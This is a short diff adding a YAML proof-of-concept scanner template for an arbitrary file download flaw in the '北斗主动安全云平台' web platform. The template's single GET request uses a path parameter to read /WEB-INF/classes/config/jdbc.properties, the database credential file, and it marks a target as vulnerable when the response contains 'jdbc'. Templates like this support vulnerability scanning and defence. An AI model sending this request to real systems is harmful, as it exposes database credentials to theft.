@@ -1,0 +1,9 @@
+name: poc-yaml-北斗主动安全云平台-Directory
+description: "任意文件下载"
+method: GET
+path:
+  - "/808gps/MobileAction_downLoad.action?path=/WEB-INF/classes/config/jdbc.properties"
+expression:
+  status: 200
+  body_any:
+    - "jdbc"
